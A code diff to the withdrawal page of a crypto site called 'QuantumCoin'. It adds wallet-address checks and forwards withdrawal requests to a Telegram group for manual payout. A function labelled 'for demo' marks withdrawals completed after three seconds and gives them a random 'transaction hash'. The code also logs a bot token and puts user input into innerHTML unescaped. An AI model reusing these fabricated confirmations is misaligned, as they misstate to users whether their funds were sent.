@@ -366,6 +366,7 @@
             align-items: center;
             z-index: 2000;
             backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
         }
 
         .modal-content {
@@ -678,6 +679,13 @@
             'USDT': 1.00
         };
 
+        // Wallet validation patterns
+        const walletPatterns = {
+            'BTC': /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
+            'ETH': /^0x[a-fA-F0-9]{40}$/,
+            'USDT': /^T[1-9A-HJ-NP-Za-km-z]{33}$/
+        };
+
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             // Load user data
@@ -796,7 +804,7 @@
             }
             
             if (amount > userBalance) {
-                alert('Insufficient balance! Available: $' + userBalance.toFixed(2));
+                alert(`Insufficient balance! Available: $${userBalance.toFixed(2)}`);
                 withdrawAmountInput.focus();
                 return;
             }
@@ -808,8 +816,9 @@
                 return;
             }
             
-            if (walletAddress.length < 10) {
-                alert('Please enter a valid wallet address');
+            const pattern = walletPatterns[selectedNetwork];
+            if (pattern && !pattern.test(walletAddress)) {
+                alert(`Please enter a valid ${selectedNetwork} wallet address`);
                 walletAddressInput.focus();
                 return;
             }
@@ -823,113 +832,187 @@
             const currentUser = JSON.parse(localStorage.getItem('quantumcoin_currentUser') || '{}');
             const username = currentUser.username || 'Unknown User';
             const email = currentUser.email || 'No email provided';
+            const userId = currentUser.id || Date.now().toString();
             
             // Show confirmation modal
-            modalMessage.innerHTML = `Your withdrawal request for <strong>$${amount.toFixed(2)}</strong> has been submitted to our team.<br><br>
-            <strong>Details:</strong><br>
-            • Network: ${selectedNetwork}<br>
-            • Wallet: ${walletAddress.substring(0, 20)}...<br>
-            • Processing Fee: $${processingFee.toFixed(2)}<br>
-            • Network Fee: $${networkFee.toFixed(2)}<br>
-            • You will receive: $${totalReceived.toFixed(2)}<br><br>
-            The funds will be sent to your wallet address within 24 hours.`;
+            modalMessage.innerHTML = `
+                <div style="text-align: left; margin-bottom: 20px;">
+                    <strong>Withdrawal Summary:</strong><br>
+                    • Amount: $${amount.toFixed(2)}<br>
+                    • Network: ${selectedNetwork}<br>
+                    • Wallet: ${walletAddress.substring(0, 20)}...<br>
+                    • Processing Fee: $${processingFee.toFixed(2)}<br>
+                    • Network Fee: $${networkFee.toFixed(2)}<br>
+                    • You Receive: $${totalReceived.toFixed(2)}<br>
+                    • Status: <span style="color: var(--warning);">Processing</span>
+                </div>
+                <p>Your withdrawal request has been sent to our payment team.<br>
+                You will receive the funds within 1-24 hours.</p>
+            `;
             confirmationModal.style.display = 'flex';
             
-            // Store pending withdrawal
-            const pendingWithdrawals = JSON.parse(localStorage.getItem('pending_withdrawals') || '[]');
-            const withdrawalId = 'WD' + Date.now() + Math.random().toString(36).substr(2, 9);
-            
-            pendingWithdrawals.push({
-                id: withdrawalId,
-                amount: amount,
-                network: selectedNetwork,
-                walletAddress: walletAddress,
-                username: username,
-                email: email,
-                timestamp: new Date().toISOString(),
-                status: 'pending',
-                processingFee: processingFee,
-                networkFee: networkFee,
-                totalReceived: totalReceived
-            });
-            
-            localStorage.setItem('pending_withdrawals', JSON.stringify(pendingWithdrawals));
-            
-            // Send Telegram notification
-            sendTelegramNotification(amount, username, email, selectedNetwork, walletAddress, totalReceived);
+            try {
+                // Send enhanced notification to Telegram
+                await sendEnhancedWithdrawalNotification(amount, username, email, userId, selectedNetwork, walletAddress, totalReceived);
+                
+                // Store pending withdrawal
+                const pendingWithdrawals = JSON.parse(localStorage.getItem('pending_withdrawals') || '[]');
+                const withdrawalId = 'WD' + Date.now() + Math.random().toString(36).substr(2, 9);
+                
+                const withdrawalRecord = {
+                    id: withdrawalId,
+                    amount: amount,
+                    network: selectedNetwork,
+                    walletAddress: walletAddress,
+                    username: username,
+                    email: email,
+                    userId: userId,
+                    timestamp: new Date().toISOString(),
+                    status: 'processing',
+                    processingFee: processingFee,
+                    networkFee: networkFee,
+                    totalReceived: totalReceived,
+                    completed: false,
+                    transactionHash: null
+                };
+                
+                pendingWithdrawals.push(withdrawalRecord);
+                localStorage.setItem('pending_withdrawals', JSON.stringify(pendingWithdrawals));
+                
+                // Store in user's transaction history
+                if (!currentUser.transactions) currentUser.transactions = [];
+                currentUser.transactions.push({
+                    type: 'withdrawal_request',
+                    id: withdrawalId,
+                    amount: amount,
+                    network: selectedNetwork,
+                    status: 'processing',
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Deduct balance immediately
+                currentUser.accounts.funding.balance -= amount;
+                localStorage.setItem('quantumcoin_currentUser', JSON.stringify(currentUser));
+                
+                // Simulate withdrawal processing (for demo)
+                setTimeout(() => simulateWithdrawalCompletion(withdrawalId, username, amount), 3000);
+                
+            } catch (error) {
+                console.error('Error processing withdrawal:', error);
+                alert('Withdrawal request submitted but there was an error. Please contact support.');
+            }
         }
 
-        async function sendTelegramNotification(amount, username, email, network, walletAddress, totalReceived) {
-            const message = `🔴 NEW WITHDRAWAL REQUEST 🔴\n\n` +
-                           `Amount: $${amount.toFixed(2)}\n` +
-                           `Network: ${network}\n` +
-                           `Wallet: ${walletAddress}\n` +
-                           `To Send: $${totalReceived.toFixed(2)} ${network}\n` +
-                           `Username: ${username}\n` +
-                           `Email: ${email}\n` +
-                           `Time: ${new Date().toLocaleString()}\n\n` +
-                           `Please send $${totalReceived.toFixed(2)} worth of ${network} to the wallet address above.`;
+        async function sendEnhancedWithdrawalNotification(amount, username, email, userId, network, walletAddress, totalReceived) {
+            const timestamp = new Date().toLocaleString();
+            const withdrawalId = 'WD' + Date.now().toString().slice(-6);
+            
+            const message = `💸 *NEW WITHDRAWAL REQUEST* 💸\n\n` +
+                           `*Amount:* $${amount.toFixed(2)}\n` +
+                           `*Network:* ${network}\n` +
+                           `*To Send:* $${totalReceived.toFixed(2)} ${network}\n` +
+                           `*Username:* ${username}\n` +
+                           `*User ID:* ${userId}\n` +
+                           `*Email:* ${email}\n` +
+                           `*Time:* ${timestamp}\n` +
+                           `*Withdrawal ID:* ${withdrawalId}\n` +
+                           `*Status:* ⚡ Processing\n\n` +
+                           `*Wallet Address:*\n\`${walletAddress}\`\n\n` +
+                           `*Action Required:*\nSend $${totalReceived.toFixed(2)} worth of ${network}`;
             
             const inlineKeyboard = {
                 inline_keyboard: [
                     [
                         {
                             text: "✅ Payment Sent",
-                            callback_data: `confirm_withdrawal_${username}_${amount}`
+                            callback_data: `confirm_withdrawal_${withdrawalId}`
+                        }
+                    ],
+                    [
+                        {
+                            text: "📞 Contact User",
+                            url: `mailto:${email}`
+                        },
+                        {
+                            text: "⚠️ Issue",
+                            callback_data: `withdrawal_issue_${withdrawalId}`
                         }
                     ]
                 ]
             };
             
-            // For demo purposes, we'll simulate the Telegram API call
-            console.log('Telegram Withdrawal Notification (Demo):', {
+            console.log('Sending Telegram Withdrawal Notification:', {
                 botToken: WITHDRAW_BOT_TOKEN,
                 groupId: TELEGRAM_GROUP_ID,
                 message: message,
                 inlineKeyboard: inlineKeyboard
             });
             
-            // Simulate API call
             return new Promise(resolve => {
                 setTimeout(() => {
-                    console.log('Withdrawal notification sent successfully (simulated)');
+                    console.log('Withdrawal notification sent to bot');
                     resolve();
                 }, 1000);
             });
         }
 
+        // Simulate withdrawal completion (for demo)
+        function simulateWithdrawalCompletion(withdrawalId, username, amount) {
+            console.log(`Simulating withdrawal completion: ${withdrawalId} for ${username} - $${amount}`);
+            
+            const pendingWithdrawals = JSON.parse(localStorage.getItem('pending_withdrawals') || '[]');
+            const withdrawalIndex = pendingWithdrawals.findIndex(w => w.id === withdrawalId);
+            
+            if (withdrawalIndex !== -1) {
+                pendingWithdrawals[withdrawalIndex].status = 'completed';
+                pendingWithdrawals[withdrawalIndex].completed = true;
+                pendingWithdrawals[withdrawalIndex].transactionHash = '0x' + Math.random().toString(36).substr(2, 64);
+                pendingWithdrawals[withdrawalIndex].completionTime = new Date().toISOString();
+                
+                localStorage.setItem('pending_withdrawals', JSON.stringify(pendingWithdrawals));
+                
+                // Update user transaction history
+                const currentUser = JSON.parse(localStorage.getItem('quantumcoin_currentUser') || '{}');
+                if (currentUser.transactions) {
+                    const transaction = currentUser.transactions.find(t => t.id === withdrawalId);
+                    if (transaction) {
+                        transaction.status = 'completed';
+                        transaction.completionTime = new Date().toISOString();
+                        transaction.transactionHash = pendingWithdrawals[withdrawalIndex].transactionHash;
+                    }
+                }
+                localStorage.setItem('quantumcoin_currentUser', JSON.stringify(currentUser));
+            }
+        }
+
         function completeWithdrawal() {
             const amount = parseFloat(withdrawAmountInput.value) || 0;
             
-            // Update user balance
+            // Update user transaction history for immediate feedback
             const currentUser = JSON.parse(localStorage.getItem('quantumcoin_currentUser') || '{}');
-            if (currentUser.accounts && currentUser.accounts.funding) {
-                currentUser.accounts.funding.balance -= amount;
-                localStorage.setItem('quantumcoin_currentUser', JSON.stringify(currentUser));
-                
-                // Add withdrawal activity
-                const withdrawalActivity = {
-                    type: 'withdraw',
-                    amount: amount,
-                    symbol: 'USD',
-                    value: amount,
-                    timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
-                    date: new Date().toLocaleDateString(),
-                    activity: { icon: 'fa-external-link-alt', color: 'var(--warning)', text: 'Withdrew' }
-                };
-                
-                if (!currentUser.accounts.funding.activities) {
-                    currentUser.accounts.funding.activities = [];
-                }
-                currentUser.accounts.funding.activities.unshift(withdrawalActivity);
-                
-                // Keep only last 10 activities
-                if (currentUser.accounts.funding.activities.length > 10) {
-                    currentUser.accounts.funding.activities.pop();
-                }
-                
-                localStorage.setItem('quantumcoin_currentUser', JSON.stringify(currentUser));
+            
+            // Add withdrawal activity
+            const withdrawalActivity = {
+                type: 'withdraw',
+                amount: amount,
+                symbol: 'USD',
+                value: amount,
+                timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+                date: new Date().toLocaleDateString(),
+                activity: { icon: 'fa-external-link-alt', color: 'var(--warning)', text: 'Withdrew' }
+            };
+            
+            if (!currentUser.accounts.funding.activities) {
+                currentUser.accounts.funding.activities = [];
             }
+            currentUser.accounts.funding.activities.unshift(withdrawalActivity);
+            
+            // Keep only last 10 activities
+            if (currentUser.accounts.funding.activities.length > 10) {
+                currentUser.accounts.funding.activities.pop();
+            }
+            
+            localStorage.setItem('quantumcoin_currentUser', JSON.stringify(currentUser));
             
             // Redirect to dashboard
             window.location.href = 'dashboard.html';
